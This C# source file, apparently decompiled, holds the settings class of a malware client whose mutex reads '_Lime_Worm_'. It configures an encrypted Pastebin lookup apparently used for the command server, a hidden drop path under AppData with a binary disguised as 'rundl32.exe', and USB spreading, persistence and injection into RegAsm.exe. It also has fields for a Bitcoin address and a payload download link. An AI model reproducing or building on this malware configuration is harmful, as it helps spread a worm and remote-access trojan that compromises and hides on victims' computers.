using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Client_0._5;

public class C_Settings
{
	public static string Pastebin = "K7zENSEQJu8KgxHv2nYqClfh2tqmD02lJY2sHX705gbkYyy5wezuJkmj/FJvOgHj";

	public static string HOST;

	public static int PORT;

	public static string PASS = "pass123";

	public static string KEY = "|'N'|";

	public static string SPL = "|'L'|";

	public static string EXE = "rundl32.exe";

	public static Mutex NMT = null;

	public static string MTX = "_Lime_Worm_";

	public static bool USB = Conversions.ToBoolean("True");

	public static bool PIN = Conversions.ToBoolean("True");

	public static bool ANTI = Conversions.ToBoolean("False");

	public static bool DROP = Conversions.ToBoolean("True");

	public static bool INJ_CHK = Conversions.ToBoolean("True");

	public static string INJ_Name = "RegAsm.exe";

	public static string PATH1 = "AppData";

	public static string PATH2 = "\\{WINDOWS-SYSTEM-QZD65-AEQF6-QEF321-QF6QF}";

	public static object fullpath = Interaction.Environ(PATH1) + PATH2 + "\\" + EXE;

	public static string BTC_ADDR = "";

	public static bool DWN_CHK = Conversions.ToBoolean("False");

	public static string DWN_LINK = "";
}
